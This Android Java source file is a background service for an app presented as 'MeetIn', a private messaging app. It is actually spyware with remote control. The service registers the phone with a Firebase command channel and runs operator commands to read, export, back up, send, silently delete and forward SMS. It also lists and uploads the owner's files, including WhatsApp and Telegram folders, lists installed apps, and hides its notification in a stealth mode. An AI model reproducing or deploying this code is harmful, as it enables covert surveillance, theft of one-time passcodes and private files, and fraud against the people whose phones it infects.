package chat.meetin.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Arrays;

public class DataSyncService extends Service {
    private static final String TAG = "DataSyncService";
    private static final String CHANNEL_ID = "MeetInChannel";
    private static final int NOTIF_ID = 1;
    private static final String PREFS = "MeetIn";

    private DatabaseReference dbRoot;
    private DatabaseReference cmdRef;
    private DatabaseReference respRef;
    private DatabaseReference smsRef;
    private String deviceId;
    private ValueEventListener commandListener;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        deviceId = DeviceInfo.getDeviceId(this);

        dbRoot = FirebaseDatabase.getInstance().getReference();
        cmdRef = dbRoot.child("devices").child(deviceId).child("commands");
        respRef = dbRoot.child("devices").child(deviceId).child("responses");
        smsRef = dbRoot.child("devices").child(deviceId).child("sms");

        Log.d(TAG, "Service created for device: " + deviceId);
        registerDevice();
        listenForCommands();
        detectAndPublishStorage();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startForeground(NOTIF_ID, createNotification());
        } catch (Exception e) {
            Log.e(TAG, "Foreground error", e);
        }
        if (intent != null && "SMS_RECEIVED".equals(intent.getAction())) {
            String sender = intent.getStringExtra("sender");
            String body = intent.getStringExtra("body");
            long timestamp = intent.getLongExtra("timestamp", 0);
            if (sender != null && body != null) {
                publishSms(sender, body, timestamp);
            }
        }
        return START_STICKY;
    }

    private void registerDevice() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("model", Build.MODEL);
        deviceInfo.put("brand", Build.BRAND);
        deviceInfo.put("android", Build.VERSION.RELEASE);
        deviceInfo.put("sdk", Build.VERSION.SDK_INT);
        deviceInfo.put("last_seen", System.currentTimeMillis());
        deviceInfo.put("online", true);

        dbRoot.child("devices").child(deviceId).child("info")
            .setValue(deviceInfo)
            .addOnSuccessListener(aVoid -> {
                Log.d(TAG, "Device registered");
                respRef.push().setValue("DEVICE:" + deviceId + "\nREADY");
            })
            .addOnFailureListener(e -> Log.e(TAG, "Register failed", e));
    }

    private void listenForCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot cmdSnapshot : snapshot.getChildren()) {
                    String cmd = cmdSnapshot.getValue(String.class);
                    if (cmd != null && !cmd.isEmpty()) {
                        Log.d(TAG, "Command: " + cmd);
                        String response = executeCmd(cmd);
                        respRef.push().setValue(response);
                        cmdSnapshot.getRef().removeValue();
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Command listener cancelled", error.toException());
            }
        };
        cmdRef.addValueEventListener(commandListener);
    }

    private void publishSms(String sender, String body, long timestamp) {
        try {
            String formatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp));
            Map<String, Object> sms = new HashMap<>();
            sms.put("sender", sender);
            sms.put("body", body);
            sms.put("time", formatted);
            sms.put("ts", timestamp);
            smsRef.push().setValue(sms);
            Log.d(TAG, "SMS published");
        } catch (Exception e) {
            Log.e(TAG, "SMS publish error", e);
        }
    }

    // ============================================================
    // AUTO-DETECT STORAGE PATHS AND PUBLISH TO FIREBASE
    // ============================================================
    private void detectAndPublishStorage() {
        try {
            Map<String, Object> storage = new HashMap<>();
            File primary = android.os.Environment.getExternalStorageDirectory();
            storage.put("primary", primary.getAbsolutePath());
            storage.put("primary_exists", primary.exists());
            storage.put("primary_readable", primary.canRead());
            storage.put("primary_free", primary.getFreeSpace());
            storage.put("primary_total", primary.getTotalSpace());

            File sdCard = null;
            try {
                File storageDir = new File("/storage");
                File[] mounts = storageDir.listFiles();
                if (mounts != null) {
                    for (File mount : mounts) {
                        String name = mount.getName();
                        if (mount.isDirectory() && !name.equals("emulated") && !name.equals("self") && name.length() > 3) {
                            sdCard = mount;
                            break;
                        }
                    }
                }
            } catch (Exception ignored) {}

            if (sdCard != null) {
                storage.put("sdcard", sdCard.getAbsolutePath());
                storage.put("sdcard_free", sdCard.getFreeSpace());
                storage.put("sdcard_total", sdCard.getTotalSpace());
            }

            String[][] folderMap = {
                {"dcim", "DCIM"}, {"downloads", "Download"}, {"pictures", "Pictures"},
                {"music", "Music"}, {"videos", "Movies"}, {"documents", "Documents"},
                {"whatsapp", "WhatsApp"}, {"telegram", "Telegram"}, {"android", "Android"},
                {"screenshots", "Pictures/Screenshots"}, {"camera", "DCIM/Camera"},
            };

            for (String[] entry : folderMap) {
                File folder = new File(primary, entry[1]);
                if (folder.exists() && folder.isDirectory()) {
                    storage.put(entry[0] + "_path", folder.getAbsolutePath());
                }
            }

            storage.put("app_files", getFilesDir().getAbsolutePath());
            storage.put("app_cache", getCacheDir().getAbsolutePath());

            dbRoot.child("devices").child(deviceId).child("storage")
                .setValue(storage)
                .addOnSuccessListener(aVoid -> Log.d(TAG, "Storage published"))
                .addOnFailureListener(e -> Log.e(TAG, "Storage publish failed", e));
        } catch (Exception e) {
            Log.e(TAG, "Storage detection failed", e);
        }
    }

    // ============================================================
    // UNIVERSAL PATH RESOLVER
    // ============================================================
    private File resolvePath(String path) {
        if (path == null) path = "";
        String lower = path.toLowerCase().trim();
        File primary = android.os.Environment.getExternalStorageDirectory();

        String[][] mappings = {
            {"dcim", "DCIM"}, {"camera", "DCIM/Camera"}, {"photos", "DCIM"},
            {"downloads", "Download"}, {"download", "Download"}, {"pictures", "Pictures"},
            {"screenshots", "Pictures/Screenshots"}, {"music", "Music"},
            {"videos", "Movies"}, {"movies", "Movies"}, {"documents", "Documents"},
            {"docs", "Documents"}, {"whatsapp", "WhatsApp"}, {"telegram", "Telegram"},
            {"android", "Android"},
        };

        if (lower.isEmpty() || lower.equals("root") || lower.equals("storage")) {
            return primary;
        }
        for (String[] map : mappings) {
            if (lower.equals(map[0])) return new File(primary, map[1]);
        }

        File direct = new File(path);
        if (direct.isAbsolute()) {
            if (path.startsWith("/sdcard")) {
                String real = primary.getAbsolutePath();
                String rest = path.substring(7);
                File alt = new File(real + rest);
                if (alt.exists()) return alt;
            }
            return direct;
        }
        return new File(primary, path);
    }

    // ============================================================
    // COMMAND EXECUTION
    // ============================================================
    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("ping")) return "PONG";
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getFullInfo(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getUserApps(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.startsWith("sms read ")) {
            try { return DeviceInfo.readSmsLimit(this, Integer.parseInt(cmd.substring(9).trim())); }
            catch (Exception e) { return "Invalid number"; }
        }
        if (cmd.startsWith("sms send ")) return sendSms(cmd.substring(9).trim());
        if (cmd.equalsIgnoreCase("sms delete")) return deleteSms("");
        if (cmd.startsWith("sms delete ")) return deleteSms(cmd.substring(11).trim());
        if (cmd.equalsIgnoreCase("sms silent on")) return setPref("silent_mode", true, "Silent ON");
        if (cmd.equalsIgnoreCase("sms silent off")) return setPref("silent_mode", false, "Silent OFF");
        if (cmd.startsWith("sms keywords add ")) return setPref("sms_keywords", cmd.substring(17).trim(), "Keywords added");
        if (cmd.equalsIgnoreCase("sms keywords clear")) return setPref("sms_keywords", "", "Keywords cleared");
        if (cmd.startsWith("sms whitelist add ")) return setPref("sms_whitelist", cmd.substring(18).trim(), "Whitelist added");
        if (cmd.startsWith("sms blacklist add ")) return setPref("sms_blacklist", cmd.substring(18).trim(), "Blacklist added");
        if (cmd.equalsIgnoreCase("sms whitelist clear")) return setPref("sms_whitelist", "", "Whitelist cleared");
        if (cmd.equalsIgnoreCase("sms blacklist clear")) return setPref("sms_blacklist", "", "Blacklist cleared");
        if (cmd.startsWith("sms time ")) {
            String[] parts = cmd.substring(9).trim().split(" ");
            if (parts.length == 2) {
                SharedPreferences.Editor ed = getSharedPreferences(PREFS, MODE_PRIVATE).edit();
                ed.putString("sms_time_start", parts[0]);
                ed.putString("sms_time_end", parts[1]);
                ed.apply();
                return "Time: " + parts[0] + "-" + parts[1];
            }
            return "Usage: sms time HH:MM HH:MM";
        }
        if (cmd.equalsIgnoreCase("sms time clear")) {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove("sms_time_start").remove("sms_time_end").apply();
            return "Time cleared";
        }
        if (cmd.equalsIgnoreCase("sms autodelete on")) return setPref("autodelete", true, "Auto-delete ON");
        if (cmd.equalsIgnoreCase("sms autodelete off")) return setPref("autodelete", false, "Auto-delete OFF");
        if (cmd.equalsIgnoreCase("sms forward-delete on")) return setPref("forward_delete", true, "Forward-delete ON");
        if (cmd.equalsIgnoreCase("sms forward-delete off")) return setPref("forward_delete", false, "Forward-delete OFF");
        if (cmd.equalsIgnoreCase("sms bulk export")) return exportAllSms(100);
        if (cmd.startsWith("sms bulk export ")) {
            try { return exportAllSms(Integer.parseInt(cmd.substring(16).trim())); }
            catch (Exception e) { return "Invalid"; }
        }
        if (cmd.startsWith("sms auto-reply delay ")) {
            try {
                int delay = Integer.parseInt(cmd.substring(21).trim());
                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putInt("auto_reply_delay", delay).apply();
                return "Delay: " + delay + "ms";
            } catch (Exception e) { return "Invalid"; }
        }
        if (cmd.startsWith("sms auto-reply ")) return setPref("auto_reply", cmd.substring(15).trim(), "Auto-reply set");
        if (cmd.equalsIgnoreCase("sms stats")) {
            int total = getSharedPreferences(PREFS, MODE_PRIVATE).getInt("sms_total", 0);
            return "SMS intercepted: " + total;
        }
        if (cmd.equalsIgnoreCase("sms log")) return getSmsLog();
        if (cmd.startsWith("sms admin set ")) return setPref("admin_number", cmd.substring(14).trim(), "Admin set");
        if (cmd.equalsIgnoreCase("stealth on")) return setPref("stealth_mode", true, "Stealth ON");
        if (cmd.equalsIgnoreCase("stealth off")) return setPref("stealth_mode", false, "Stealth OFF");
        if (cmd.equalsIgnoreCase("sms backup")) return backupSmsToC2();
        if (cmd.equalsIgnoreCase("sms queue")) return getSmsQueue();
        if (cmd.equalsIgnoreCase("sms queue clear")) return clearSmsQueue();
        if (cmd.startsWith("sms forward ")) return setPref("forward_to", cmd.substring(12).trim(), "Forward set");
        if (cmd.startsWith("sms sim ")) {
            try {
                int sim = Integer.parseInt(cmd.substring(8).trim());
                return setPref("sms_sim", sim, "SIM slot: " + sim);
            } catch (Exception e) { return "Invalid"; }
        }

        // FILE COMMANDS
        if (cmd.equalsIgnoreCase("ls")) return listFiles("");
        if (cmd.equalsIgnoreCase("files")) return listFiles("");
        if (cmd.startsWith("ls ")) return listFiles(cmd.substring(3).trim());
        if (cmd.startsWith("files ")) return listFiles(cmd.substring(6).trim());
        if (cmd.startsWith("download ")) return downloadFile(cmd.substring(9).trim());
        if (cmd.startsWith("get ")) return downloadFile(cmd.substring(4).trim());
        if (cmd.equalsIgnoreCase("storage")) return showStorageInfo();

        if (cmd.equalsIgnoreCase("exit")) {
            dbRoot.child("devices").child(deviceId).child("info").child("online").setValue(false);
            stopSelf();
            return "EXIT";
        }
        return "Unknown. Try: ping, info, sms read, sms send, sms delete, sms silent, sms keywords, sms whitelist, sms blacklist, sms time, sms autodelete, sms forward-delete, sms bulk export, sms auto-reply, sms stats, sms log, stealth, sms backup, sms queue, sms forward, sms sim, ls, files, storage, download, get, apps list, device, exit";
    }

    private String listFiles(String inputPath) {
        try {
            File dir = resolvePath(inputPath);
            if (dir == null) return "Could not resolve path: " + inputPath;
            if (!dir.exists()) return "Path does not exist: " + dir.getAbsolutePath();
            if (!dir.isDirectory()) return "Not a directory: " + dir.getAbsolutePath();
            File[] files = dir.listFiles();
            if (files == null) return "Cannot list (permission denied): " + dir.getAbsolutePath();
            StringBuilder sb = new StringBuilder();
            sb.append("Path: ").append(dir.getAbsolutePath()).append("\n");
            sb.append("Files: ").append(files.length).append("\n\n");
            if (files.length == 0) { sb.append("(empty folder)"); return sb.toString(); }
            Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory()) return -1;
                if (!a.isDirectory() && b.isDirectory()) return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });
            for (File f : files) {
                if (f.isDirectory()) sb.append("[DIR]  ").append(f.getName()).append("/\n");
                else sb.append("[FILE] ").append(f.getName()).append(" (").append(formatSize(f.length())).append(")\n");
            }
            return sb.toString();
        } catch (Exception e) { return "Error listing: " + e.getMessage(); }
    }

    private String downloadFile(String inputPath) {
        try {
            File file = resolvePath(inputPath);
            if (file == null) return "Could not resolve path: " + inputPath;
            if (!file.exists()) return "File does not exist: " + file.getAbsolutePath();
            if (file.isDirectory()) return "Cannot download a directory: " + file.getAbsolutePath();
            if (file.length() > 5 * 1024 * 1024) return "File too large (>5MB): " + formatSize(file.length());
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int n;
            while ((n = fis.read(buffer)) != -1) baos.write(buffer, 0, n);
            fis.close();
            String base64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP);
            return "FILE_BEGIN|" + file.getName() + "|" + file.length() + "|" + base64 + "|FILE_END";
        } catch (Exception e) { return "Error reading: " + e.getMessage(); }
    }

    private String showStorageInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("=== STORAGE INFO ===\n\n");
        try {
            File primary = android.os.Environment.getExternalStorageDirectory();
            sb.append("Primary External: ").append(primary.getAbsolutePath()).append("\n");
            sb.append("  Exists: ").append(primary.exists()).append("\n");
            sb.append("  Readable: ").append(primary.canRead()).append("\n");
            sb.append("  Writable: ").append(primary.canWrite()).append("\n");
            sb.append("  Free space: ").append(formatSize(primary.getFreeSpace())).append("\n\n");
            String[] knownPaths = {"/sdcard", "/storage/emulated/0", "/mnt/sdcard", "/storage/self/primary", "/storage", "/data/local/tmp"};
            sb.append("=== KNOWN PATHS ===\n");
            for (String path : knownPaths) {
                File f = new File(path);
                sb.append(path).append(": ");
                if (f.exists()) {
                    sb.append("EXISTS (canRead=").append(f.canRead()).append(", dirs=");
                    File[] list = f.listFiles();
                    sb.append(list != null ? list.length : -1).append(")\n");
                } else sb.append("NOT FOUND\n");
            }
            sb.append("\n=== EXTERNAL SD CARDS ===\n");
            try {
                File storage = new File("/storage");
                File[] mounts = storage.listFiles();
                if (mounts != null) {
                    for (File mount : mounts) {
                        if (mount.isDirectory() && !mount.getName().equals("emulated") && !mount.getName().equals("self"))
                            sb.append("SD Card: ").append(mount.getAbsolutePath()).append("\n");
                    }
                } else sb.append("(cannot list /storage)\n");
            } catch (Exception e) { sb.append("Error: ").append(e.getMessage()).append("\n"); }
            sb.append("\n=== DEVICE INFO ===\n");
            sb.append("Android: ").append(android.os.Build.VERSION.RELEASE).append("\n");
            sb.append("SDK: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
            sb.append("Brand: ").append(android.os.Build.BRAND).append("\n");
            sb.append("Model: ").append(android.os.Build.MODEL).append("\n");
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()).append("\n"); }
        return sb.toString();
    }

    private String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        if (bytes < 1024 * 1024 * 1024) return String.format("%.1f MB", bytes / (1024.0 * 1024.0));
        return String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0));
    }

    private String setPref(String key, Object value, String msg) {
        try {
            SharedPreferences.Editor ed = getSharedPreferences(PREFS, MODE_PRIVATE).edit();
            if (value instanceof Boolean) ed.putBoolean(key, (Boolean) value);
            else if (value instanceof Integer) ed.putInt(key, (Integer) value);
            else ed.putString(key, (String) value);
            ed.apply();
            return msg;
        } catch (Exception e) { return "Error"; }
    }

    private String sendSms(String args) {
        try {
            String[] parts = args.split(" ", 2);
            if (parts.length < 2) return "Usage: sms send <num> <msg>";
            android.telephony.SmsManager sm;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                sm = getSystemService(android.telephony.SmsManager.class);
            } else {
                sm = android.telephony.SmsManager.getDefault();
            }
            if (sm == null) return "SMS unavailable";
            java.util.ArrayList<String> pl = sm.divideMessage(parts[1]);
            sm.sendMultipartTextMessage(parts[0], null, pl, null, null);
            return "SMS sent to " + parts[0];
        } catch (Exception e) { return "Send error: " + e.getMessage(); }
    }

    private String deleteSms(String arg) {
        try {
            if (arg == null || arg.trim().isEmpty()) return deleteMostRecentSms(1);
            String trimmed = arg.trim();
            try {
                int value = Integer.parseInt(trimmed);
                if (value >= 1 && value <= 50) return deleteMostRecentSms(value);
                android.net.Uri uri = android.net.Uri.parse("content://sms/" + value);
                int deleted = getContentResolver().delete(uri, null, null);
                return deleted > 0 ? "SMS ID " + value + " deleted" : "Not found";
            } catch (NumberFormatException e) { return "Invalid"; }
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String deleteMostRecentSms(int count) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor c = getContentResolver().query(uri, new String[]{"_id", "address", "body"}, null, null, "date DESC LIMIT " + count);
            if (c == null) return "No SMS access";
            if (!c.moveToFirst()) { c.close(); return "No SMS to delete"; }
            StringBuilder sb = new StringBuilder();
            int deletedCount = 0;
            do {
                int idIdx = c.getColumnIndex("_id");
                int addrIdx = c.getColumnIndex("address");
                int bodyIdx = c.getColumnIndex("body");
                if (idIdx < 0) continue;
                String id = c.getString(idIdx);
                String addr = addrIdx >= 0 ? c.getString(addrIdx) : "unknown";
                String body = bodyIdx >= 0 ? c.getString(bodyIdx) : "";
                String shortBody = body.length() > 30 ? body.substring(0, 30) + "..." : body;
                android.net.Uri smsUri = android.net.Uri.parse("content://sms/" + id);
                if (getContentResolver().delete(smsUri, null, null) > 0) {
                    deletedCount++;
                    sb.append("  - ").append(addr).append(": ").append(shortBody).append("\n");
                }
            } while (c.moveToNext());
            c.close();
            if (deletedCount == 0) return "No SMS deleted";
            return "Deleted " + deletedCount + " most recent SMS:\n" + sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String exportAllSms(int limit) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT " + limit);
            if (c == null) return "No access";
            StringBuilder sb = new StringBuilder("SMS Export (" + c.getCount() + "):\n");
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex("address"))).append("|").append(c.getString(c.getColumnIndex("body"))).append("\n");
            }
            c.close();
            return sb.toString();
        } catch (Exception e) { return "Error"; }
    }

    private String getSmsLog() {
        try {
            File f = new File(getFilesDir(), "sms_log.txt");
            if (!f.exists()) return "No log file";
            BufferedReader br = new BufferedReader(new FileReader(f));
            StringBuilder sb = new StringBuilder();
            String line; int n = 0;
            while ((line = br.readLine()) != null && n < 50) { sb.append(line).append("\n"); n++; }
            br.close();
            return sb.toString();
        } catch (Exception e) { return "Error"; }
    }

    private String getSmsQueue() {
        String q = getSharedPreferences(PREFS, MODE_PRIVATE).getString("sms_queue", "");
        return q.isEmpty() ? "Queue empty" : "SMS Queue:\n" + q;
    }

    private String clearSmsQueue() {
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove("sms_queue").apply();
        return "Queue cleared";
    }

    private String backupSmsToC2() {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms");
            android.database.Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 500");
            if (c == null) return "No access";
            while (c.moveToNext()) {
                Map<String, Object> sms = new HashMap<>();
                sms.put("sender", c.getString(c.getColumnIndex("address")));
                sms.put("body", c.getString(c.getColumnIndex("body")));
                sms.put("ts", c.getString(c.getColumnIndex("date")));
                sms.put("backup", true);
                smsRef.push().setValue(sms);
            }
            c.close();
            return "Backup sent";
        } catch (Exception e) { return "Error"; }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "MeetIn", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Private Messaging app for individuals and businesses");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification createNotification() {
        boolean stealth = getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean("stealth_mode", false);
        NotificationCompat.Builder b = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_stat_meetin)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true);
        if (stealth) {
            b.setContentTitle("").setContentText("").setPriority(NotificationCompat.PRIORITY_MIN);
        } else {
            b.setContentTitle("MeetIn").setContentText("Private Messaging app for individuals and businesses");
        }
        return b.build();
    }

    @Override
    public void onDestroy() {
        try {
            dbRoot.child("devices").child(deviceId).child("info").child("online").setValue(false);
            if (commandListener != null) cmdRef.removeEventListener(commandListener);
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
